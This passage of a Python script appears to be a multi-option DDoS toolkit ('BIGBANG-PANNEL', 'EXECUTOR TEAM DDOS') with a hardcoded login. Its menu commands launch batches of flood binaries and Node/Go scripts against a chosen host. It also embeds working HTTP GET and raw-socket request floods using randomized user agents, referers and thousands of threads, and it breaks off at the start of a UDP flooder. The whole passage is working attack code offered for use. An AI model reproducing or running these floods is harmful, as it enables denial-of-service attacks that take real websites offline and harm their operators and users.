  \033[1;37m                VVIP     : \033[35m[ \033[32mVVIP \033[35m]
  \033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
            main()
      elif sinput == "https2" or sinput == "HTTPS2":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .godzilla && screen -dm ./tls {host} {time} 8 8 500')
          os.system(f'cd .godzilla && screen -dm node tlsv2.js {host} {time} 500 2')
          os.system(f'cd .randomstring && screen -dm ./screetvip {host} {time} 500 5')
          os.system(f'cd .godzilla && screen -dm node HTTP.js {host} 500 1 {time}')
          os.system(f'cd .resources && screen -dm go run Hulk.go -site {host} -data GET')
          os.system(f'cd .resources && screen -dm go run strike.go -url {host} GET')
          os.system(f'cd .RAT && screen -dm ./passkey {host} {time} 128 GET proxy.txt 128')
          os.system(f'cd /media && screen -dm ./passkey {host} {time} 128 GET proxy.txt 128')
          os.system(f'cd /media && screen -dm go run Hulk.go -site {host} -data POST')
          os.system(f'cd /media && screen -dm go run strike.go -url {host} POST')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                METHOD   : \033[35m[ \033[1;37mHTTPS2 \033[35m]
  \033[1;37m                VVIP     : \033[35m[ \033[32mVVIP \033[35m]
  \033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
            main()
      elif sinput == "bypass" or sinput == "BYPASS":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .RAT && screen -dm ./passkey {host} {time} 128 GET proxy.txt 16')
          os.system(f'cd .RATC && screen -dm ./passkey {host} {time} 100 GET proxy.txt 32')
          os.system(f'cd /media && screen -dm ./passkey {host} {time} 128 GET proxy.txt 16')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                METHOD   : \033[35m[ \033[1;37mBYPASS \033[35m]
  \033[1;37m                VVIP     : \033[35m[ \033[32mVVIP \033[35m]
  \033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
            main()
      elif sinput == "mix" or sinput == "MIX":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .SUDAN && screen -dm node OVER.js {host} 64 {time}')
          os.system(f'cd .SUDANC && screen -dm node OVER4.js {host} {time} 10 GET proxy.txt 64')
          os.system(f'cd .SUDAN && screen -dm node OVER2.js {host} {time} 10 proxy.txt 64 10')
          os.system(f'cd .SUDANC && screen -dm node OVER5.js {host} {time} 8 1 proxy.txt')
          os.system(f'cd .SUDAN && screen -dm node OVER3.js {host} {time} 10 32 proxy.txt --debug=false --ua=all --querystring=true')
          os.system(f'cd .SUDANC && screen -dm node OVER6.js {host} {time} 64 10 proxy.txt')
          os.system(f'cd .randomstring && screen -dm ./screetvip {host} {time} 50 10')
          os.system(f'cd /media && screen -dm node OVER.js {host} 32 {time}')
          os.system(f'cd /media && screen -dm node OVER2.js {host} {time} 10 proxy.txt 32 10')
          os.system(f'cd /media && screen -dm node OVER3.js {host} {time} 10 32 proxy.txt --debug=false --ua=all --querystring=true')
          os.system(f'cd /media && screen -dm node OVER4.js {host} {time} 10 GET proxy.txt 32')
          os.system(f'cd /media && screen -dm ./screetvip {host} {time} 50 10')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                METHOD   : \033[35m[ \033[1;37mMIX \033[35m]
  \033[1;37m                VVIP     : \033[35m[ \033[32mVVIP \033[35m]
  \033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
            main()			    
      elif sinput == "bot2" or sinput == "BOT2":
        try:
          host = sin.split()[1]
          time = sin.split()[2]
          os.system(f'cd .SUDAN && screen -dm node OVER.js {host} 64 {time}')
          os.system(f'cd .randomstring && screen -dm python3 input.py {host} {time}')	
          os.system(f'cd /media && screen -dm node OVER.js {host} 16 {time}')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                METHOD   : \033[35m[ \033[1;37mBOT2 \033[35m]
  \033[1;37m                LAYER-12 : \033[35m[ \033[32mVVIP \033[35m]
  \033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
            main()			    
      elif sinput == "browser" or sinput == "BROWSER":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .BF && screen -dm ./BROWSER {host} {time} 64 10')
          os.system(f'cd .BF2 && screen -dm ./BROWSER1 GET {host} proxy.txt {time} 64 10')
          os.system(f'cd .BF && screen -dm node BROWSER3.js {host} {time} 64 10 proxy.txt')
          os.system(f'cd .BF2 && screen -dm node BROWSER4.js {host} {time} 64 10 proxy.txt')
          os.system(f'cd .BF3 && screen -dm node BROWSER2.js {host} {time} 64 10 proxy.txt')
          os.system(f'cd .BF3 && screen -dm node BROWSER5.js {host} {time} 64 10 proxy.txt')
          os.system(f'cd .RAT && screen -dm ./passkey {host} {time} 128 GET proxy.txt 16')
          os.system(f'cd .worm && screen -dm ./tls-linux {host} {time} 40 3 500')
          os.system(f'cd .wormc && screen -dm ./tls-linux {host} {time} 40 3 500')	
          os.system(f'cd .godzilla && screen -dm ./tls {host} {time} 8 5 500')
          os.system(f'cd /media && screen -dm ./passkey {host} {time} 128 GET proxy.txt 16')
          os.system(f'cd /media && screen -dm ./tls-linux {host} {time} 40 3 500')
          os.system(f'cd /media && screen -dm ./tls {host} {time} 8 8 500')
          os.system(f'cd /media && screen -dm ./BROWSER {host} {time} 64 10')
          os.system(f'cd /media && screen -dm node BROWSER4.js {host} {time} 64 10 proxy.txt')
          os.system(f'cd /media && screen -dm node BROWSER2.js {host} {time} 64 10 proxy.txt')
          os.system(f'cd /media && screen -dm node BROWSER5.js {host} {time} 64 10 proxy.txt')	
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                METHOD   : \033[35m[ \033[1;37mBROWSER \033[35m]
  \033[1;37m                VVIP     : \033[35m[ \033[32mVVIP \033[35m]
  \033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
            main()
      elif sinput == "killnet" or sinput == "KILLNET":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .godzilla && screen -dm ./tls {host} {time} 8 8 500')
          os.system(f'cd .worm && screen -dm ./tls-linux {host} {time} 40 3 500')
          os.system(f'cd .malware && screen -dm ./tls {host} {time} 8 5 500')
          os.system(f'cd .randomstring && screen -dm ./screetvip {host} {time} 50 10')
          os.system(f'cd .RAT && screen -dm ./passkey {host} {time} 128 GET proxy.txt 16')
          os.system(f'cd .wormc && screen -dm ./tls-linux {host} {time} 64 1 500')
          os.system(f'cd .RATC && screen -dm ./passkey {host} {time} 128 GET proxy.txt 128')
          os.system(f'cd .resources && screen -dm node uambypass.js {host} {time} 128 http.txt')
          os.system(f'cd .BF2 && screen -dm ./BROWSER1 GET {host} proxy.txt {time} 64 10')
          os.system(f'cd .randomstring && cd examples && screen -dm java input2.java {host} 8000')
          os.system(f'cd .malware && screen -dm node tlsv2.js {host} {time} 64 1')
          os.system(f'cd .godzilla && screen -dm node HTTP.js {host} 500 5 {time}')
          os.system(f'cd .resources && screen -dm go run Hulk.go -site {host} -data POST')
          os.system(f'cd /media && screen -dm ./tls {host} {time} 64 3 500')
          os.system(f'cd /media && screen -dm ./tls-linux {host} {time} 40 3 500')
          os.system(f'cd /media && screen -dm ./screetvip {host} {time} 50 10')
          os.system(f'cd /media && screen -dm ./passkey {host} {time} 128 GET proxy.txt 16')
          os.system(f'cd /media && screen -dm node uambypass.js {host} {time} 128 http.txt')
          os.system(f'cd /media && screen -dm ./BROWSER1 GET {host} proxy.txt {time} 64 10')
          os.system(f'cd /media && screen -dm node tlsv2.js {host} {time} 64 1')
          os.system(f'cd /media && screen -dm node HTTP.js {host} 500 5 {time}')
          os.system(f'cd /media && screen -dm go run Hulk.go -site {host} -data POST')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                VVIP     : \033[35m[ \033[1;37mKILLNET \033[35m]
  \033[1;37m                VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()			    			    
      elif sinput == "uam" or sinput == "UAM":
        try:
          host = sin.split()[1]
          port = sin.split()[2]
          time = sin.split()[3]
          os.system(f'cd .resources && screen -dm node uambypass.js {host} {time} 128 http.txt')
          os.system(f'cd /media && screen -dm node uambypass.js {host} {time} 128 http.txt')
          os.system ("clear")
          print(f"""
  \033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
  \033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
  \033[35m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩\033[1;37m ╚═╝╚═╝╝╚╝ ╩
  \033[1;37m                            ATTACK HAS BEEN STARTED!
  \033[35m                ╚╦════════════════════════════════════════════╦╝
  \033[35m           ╔═════╩════════════════════════════════════════════╩═════╗
  \033[1;37m                   TARGET   : \033[35m[ \033[1;37m{host} \033[35m]
  \033[1;37m                   TIME     : \033[35m[ \033[1;37m{time} \033[35m]
  \033[1;37m                   PORT     : \033[35m[ \033[1;37m{port} \033[35m]
  \033[1;37m                   LAYER-7   : \033[35m[ \033[1;37mUAM \033[35m]
  \033[1;37m                   VIP      : \033[35m[ \033[32mTrue \033[35m]
  \033[1;37m                   USER     : \033[35m[ \033[1;37mMrcyber \033[35m]
  \033[35m           ╚════════════════════════════════════════════════════════╝
  """)
        except ValueError:
          main()
        except IndexError:
          main()





  def login():
      os.system("clear")
      user = "root"
      passwd = "23"
      username = input("""







                              \33[0;32mLOGIN TO BIGBANG-PANNEL : """)
      password = getpass.getpass(prompt="""                  
                              \33[0;32mPASSWORDS       : """)
      if username != user or password != passwd:
          print("")
          print(f"""        
                                ☠️ \033[1;31;40mBUY YA SAYANG!!!🚫""")
          time.sleep(0.6)
          sys.exit(1)
      elif username == user and password == passwd:
          print("""                                              
                            \33[0;32mWELLCOME TO EXECUTOR TEAM DDOS""")
          time.sleep(0.3)
      menu()
      main()


  login()



if pilih == "4":
  import os
  import requests
  import threading
  import random
  import os
  import time
  import proxy

  print ('''
  ░░░░░▄▄▄▄▀▀▀▀▀▀▀▀▄▄▄▄▄▄░░░░░░░░░░
  ░░░░░█░░░░▒▒▒▒▒▒▒▒▒▒▒▒░░▀▀▄░░░░░░
  ░░░░█░░░▒▒▒▒▒▒░░░░░░░░▒▒▒░░█░░░░░
  ░░░█░░░░░░▄██▀▄▄░░░░░▄▄▄░░░░█░░░░
  ░▄▀▒▄▄▄▒░█▀▀▀▀▄▄█░░░██▄▄█░░░░█░░░
  █░▒█▒▄░▀▄▄▄▀░░░░░░░░█░░░▒▒▒▒▒░█░░
  █░▒█░█▀▄▄░░░░░█▀░░░░▀▄░░▄▀▀▀▄▒█░░ 
  ░█░▀▄░█▄░█▀▄▄░▀░▀▀░▄▄▀░░░░█░░█░░░
  ░░█░░░▀▄▀█▄▄░█▀▀▀▄▄▄▄▀▀█▀██░█░░░░
  ░░░█░░░░██░░▀█▄▄▄█▄▄█▄████░█░░░░░
  ░░░░█░░░░▀▀▄░█░░░█░█▀██████░█░░░░
  ░░░░░▀▄░░░░░▀▀▄▄▄█▄█▄█▄█▄▀░░█░░░░
  ░░░░░░░▀▄▄░▒▒▒▒░░░░░░░░░░▒░░░█░░░
  ░░░░░░░░░░▀▀▄▄░▒▒▒▒▒▒▒▒▒▒░░░░█░░░
  ░░░░░░░░░░░░░░▀▄▄▄▄▄░░░░░░░░█░░░░
  ''')

  print (''' 

  \33[1;35m [>___> _ *]  By Billz Lulzsec v2.0                                                                            
  ''')
  url = input("HOST:  ").strip() 

  count = 0
  headers = []
  referer = [
      "https://google.it/",
      "https://facebook.com/",
      "https://duckduckgo.com/",
      "https://google.com/",
      "https://youtube.com",
      "https://yandex.com",
      "http://jobs.leidos.com/search?q=",
      "http://jobs.bloomberg.com/searchq=",
      "https://www.pinterest.com/search/q=",
      "http://millercenter.org/search?q=",
      "https://www.npmjs.com/search?q=",
      "http://www.evidence.nhs.uk/searhq=",
      "http://www.ted.com/search?q=",
      "'http://funnymama.com/search?q=",
      "http://itch.io/search?q=",
      "http://jobs.rbs.com/jobs/search?q=",
      "http://millercenter.org/search?q=",
      "http://anonymouse.org/",
      "http://coccoc.com/search#query=",
      "http://ddosvn.somee.com/f5.php?v=",
      "http://engadget.search.aol.com/",
      "http://eu.battle.net/wow/en/search?q=",
      "http://filehippo.com/search?q=",
      "http://funnymama.com/search?q=",
      "http://go.mail.ru/search?mail.ru=1&q=",
      "http://host-tracker.com/",
      "http://itch.io/search?q=",
      "http://ytmnd.com/search?q=",
      "https://add.my.yahoo.com/rss?url=",
      "https://check-host.net/", 
      "https://duckduckgo.com/",
      "https://pornhub.com/",
      "https://r.search.yahoo.com/",
      "https://vk.com/",

  ]


  def useragent():
      global headers
      headers.append("Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; RM-1152)")
      headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)")
      headers.append("Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36")
      headers.append("Mozilla/5.0 (Windows; U; Windows NT 5.0; es-ES; rv:1.8.0.3) Gecko/20060426 Firefox/1.5.0.3")
      headers.append("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:97.0) Gecko/20100101 Firefox/97.0")
      headers.append("Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/36.0  Mobile/15E148 Safari/605.1.15")
      headers.append("Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36")
      headers.append("Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36")
      headers.append("Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Mobile Safari/537.36")
      headers.append("Mozilla/5.0 (Windows NT 6.1; U; nl; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 11.01")
      headers.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1")
      headers.append("Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11")
      headers.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6")
      headers.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6")
      headers.append("Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1")
      headers.append("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5")
      headers.append("Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5")
      headers.append("Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3")
      headers.append("Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"),
      headers.append("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3")


      return headers


  def genstr(size):
      out_str = ''

      for _ in range(10, size):
          code = random.randint(65, 90)
          out_str += chr(code)

      return out_str


  class httpth1(threading.Thread):
      def run(self):
          global count
          while True:
              try:
                  headers={'User-Agent' : random.choice(useragent()), 'Referer' : random.choice(referer)}
                  randomized_url = url + "?" + genstr(random.randint(3, 50))
                  requests.get(randomized_url, headers=headers)
                  count += 2
                  print ("{0} attack sent success☠️".format(count))
              except requests.exceptions.ConnectionError:
                  print ("[connection time out]")
                  pass
              except requests.exceptions.InvalidSchema:
                  print ("[attack sent!!!]")
                  raise SystemExit()
              except ValueError:
                  print ("[WEB SUDAH DOWN BY BILLZ LULZSECURITY]")
                  raise SystemExit()
              except KeyboardInterrupt:
                  print("[Canceled by User]")
                  raise SystemExit()


  while True:
      try:
          th1 = httpth1()
          th1.start()
      except Exception:
          pass
      except KeyboardInterrupt:
          exit("[OUT]")
          raise SystemExit()

if pilih == "5":
  import os, sys
  import requests, urllib3
  import socket, socks, threading, random, re, os
  import sys, glob, time, requests, ssl, webbrowser
  import bz2, datetime, wget, json, cfscrape, urllib3
  from time import sleep
  from os import system
  from sys import stdout
  from scapy.all import *
  from random import randint
  import ssl
  os.system('cls')

  urllib3.disable_warnings()
  urllib3.PoolManager()

  useragents=[""]

  ref = [""]

  acceptall = [""]  


  def logo():
      os.system('color 4')
      print("")
      try:
          print(" Target : " +str(url_main)+ ":" +str(port))
      except:
          pass
      try:
          print(" Method : " +str(name_method_attack))
      except:
          pass
      try:
          print(" Mode   : " +str(filenam2))
      except:
          pass
      try:
          print(" Threads: " +str(threads))
      except:
          pass

  logo()

  def start_url():
      global url, url_main, host_url, host_ip, port
      if sys.platform.startswith("linux"):
          pass
      elif sys.platform.startswith("freebsd"):
          pass
      else:
          path = "C:/Program Files/nodejs/node.exe"
          if (not os.path.isfile(path)):
              print("[!] Please Install NodeJs. Downloading... [!]")
              down = wget.download("https://nodejs.org/dist/v12.13.0/node-v12.13.0-x64.msi")
              down
              os.system("node-v12.13.0-x64.msi")#Credit to Nii-Chan
      logo()
      url = input("Target [URL/IP]: ").strip()
      if url == "":
          start_url()
      url_main = url
      try:
          if url[0]+url[1]+url[2]+url[3] == "www.":
              url = "http://" + url
          elif url[0]+url[1]+url[2]+url[3] == "http":
              pass
          else:
              url = "http://" + url
      except:
          print("You Mistyped, Try Again ")
          start_url()
      logo()
      try:
          host_url = url.replace("http://", "").replace("https://", "").split("/")[0].split(":")[0]
      except:
          host_url = url.replace("http://", "").replace("https://", "").split("/")[0]
      host_ip = socket.gethostbyname(host_url)
  start_url()
  def start_port():
      global port
      print("-----------------------------")
      port = str(input(" Port: "))
      if port == '':
          if "http" in url:
                  port = int(80)
                  print(" Selected Port = 80")
          else:
              port = int(80)
              print(" Selected Port = 80 ")
      else:
          port = int(port)
  start_port
  def start_mode():
      global choice_mode, filenam1, filenam2, method_pass_cf
      print("")
      choice_mode = input(" MODE [TYE 0] ")
      if choice_mode == "0":
          filenam2 = "Home"
          logo()
          numthreads()
      else:
          print (" You mistyped, try again ")
          start_mode()


  def choice_method_attack():
      global method_attack, name_method_attack
      print("-----------------------------")
      print(" 1: HTTP Request [ Normal ]")
      print(" 2: HTTP Request [  Spam  ]")
      method_attack = input("Choice Request [1/2]: ")
      if (method_attack == "1") or (method_attack == ""):
          name_method_attack = "Normal"
          print(" Selected Method Attack Normal")
          method_attack = "1"
      elif method_attack == "2":
          name_method_attack = "Spam"
          print(" Selected Method Attack Spam")
      else:
          print ("You mistyped, try again ")
          choice_method_attack()
      logo()
      start_mode()



  def numthreads():
      global threads
      try:
          print("-----------------------------")
          threads = int(input(" Threads [2000]: "))
      except ValueError:
          threads = int(2000)
          print (" Selected Threads " +str(threads)+ " [!]\n")
      logo()
      begin()

  def begin():
      choice6 = input('Press "Enter" to start DoS ')
      if choice6 == "":
          attack()
          print()
      else:
          sys.exit()

  def attack():
      global threads, get_host, acceptall, connection, content, length, x, req_code, error, max_req, multiple
      x     = int(0)
      error = int(0)
      req_code = int(0)
      multiple = int(100)
      connection = "Connection: Keep-Alive\r\n"
      content    = "Content-Type: application/x-www-form-urlencoded\r\n"
      length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
      if choice_mode == "0":
          for x in range(threads):
              Home(x+1).start()

  class Home(threading.Thread):
      def __init__(self, counter):
          threading.Thread.__init__(self)
          self.counter = counter

      def run(self):
          global req_code, error
          useragent = "User-Agent: " + random.choice(useragents) + "\r\n"
          accept    = random.choice(acceptall)
          referer   = "Referer: " +random.choice(ref) + url+ "\r\n"
          if method_attack == "1":
              get_host = "GET / HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
              request  = get_host + useragent + accept + content + length + "\r\n"
          else:
              get_host = 'GET' + " /?=" +str(random.randint(0,20000))+ " HTTP/1.1\r\nHost: " +host_url+":"+str(port)+ "\r\n"
              request  = get_host + useragent + accept + referer + content + length + "\r\n"
          while True:
              try:
                  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                  s.connect((str(host_url), int(port)))
                  s.send(str.encode(request))
                  s.send(str.encode(request))
                  s.send(str.encode(request))
                  s.send(str.encode(request))
                  s.send(str.encode(request))
                  s.send(str.encode(request))
                  s.send(str.encode(request))
                  s.send(str.encode(request))
                  s.send(str.encode(request))
                  s.send(str.encode(request))
                  print("HTTP Request to The Server "  " => " +str(host_url)+ ":" +str(port))
                  try:
                      for y in range(multiple):
                          s.send(str.encode(request))
                          s.send(str.encode(request))
                          s.send(str.encode(request))
                          s.send(str.encode(request))
                          s.send(str.encode(request))
                          s.send(str.encode(request))
                          s.send(str.encode(request))
                          s.send(str.encode(request))
                          s.send(str.encode(request))
                          s.send(str.encode(request))
                          print("Attacking The Server "  " => " +str(host_url)+ ":" +str(port))
                  except:
                      try:
                          s.close()
                          error += 1
                      except:
                          pass
              except:
                  try:
                      s.close()
                      error += 1
                  except:
                      pass

      start_port()
      logo()
      choice_method_attack()
  if __name__ == '__main__':
      start_url()

if pilih == "6":
  #!/usr/bin/python3
  # -*- coding: utf-8 -*-

  from time import sleep
  from colorama import Fore,Style
  from user_agent import generate_user_agent
  import time,sys,os,socket,threading,random,requests

  # Not responsible for any improper use of this program !
  # FREE Tool By @fk3m (instagram)
  # All rights reserved for @fk3m (instagram) 2023 | Coder : Klarks !


  keepl   = random.randint(110,120)
  KeepA   = (f"'{keepl}'")
  bytes   = random._urandom(1490)
  s       = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  n       = 0
  head    = {
      'User-Agent': generate_user_agent(),
      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
      'Accept-Language': 'en-us,en;q=0.5',
      'Accept-Encoding': 'gzip,deflate',
      'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
      'Keep-Alive': KeepA,
      'Connection': 'keep-alive'
  }

  def myBots():
      global bots
      bots = []
      bots.append('https://www.nasa.gov/topics/search?q=')
      bots.append('https://www.facebook.com/en/search?q=')
      bots.append('http://jigsaw.w3.org/css-validator/validator?uri=')
      bots.append('https://drive.google.com/viewerng/viewer?url=')
      bots.append('http://engadget.search.aol.com/search?q=')
      bots.append('http://help.baidu.com/searchResult?keywords=')
      bots.append('http://www.bing.com/search?q=')
      bots.append('https://www.yandex.com/yandsearch?text=')
      bots.append('https://drive.google.com/viewerng/viewer?url=')
      bots.append('https://duckduckgo.com/?q=')
      bots.append('http://www.ask.com/web?q=')
      bots.append('http://search.aol.com/aol/search?q=')
      bots.append('http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=')
      bots.append('https://add.my.yahoo.com/rss?url=')
      bots.append('http://www.google.com/?q=')
      bots.append('http://www.usatoday.com/search/results?q=')
      bots.append('https://steamcommunity.com/market/search?q=')
      bots.append('http://filehippo.com/search?q=')
      bots.append('http://www.topsiteminecraft.com/site/pinterest.com/search?q=')
      bots.append('http://eu.battle.net/wow/en/search?q=')
      bots.append('http://careers.gatesfoundation.org/search?q=')
      bots.append('https://drive.google.com/viewerng/viewer?url=')
      bots.append('http://techtv.mit.edu/search?q=')
      bots.append('http://www.ustream.tv/search?q=')
      bots.append('http://www.ted.com/search?q=')
      bots.append('http://funnymama.com/search?q=')
      bots.append('http://www.bestbuytheater.com/events/search?q=')
      bots.append('http://jobs.leidos.com/search?q=')
      bots.append('https://www.pinterest.com/search/?q=')
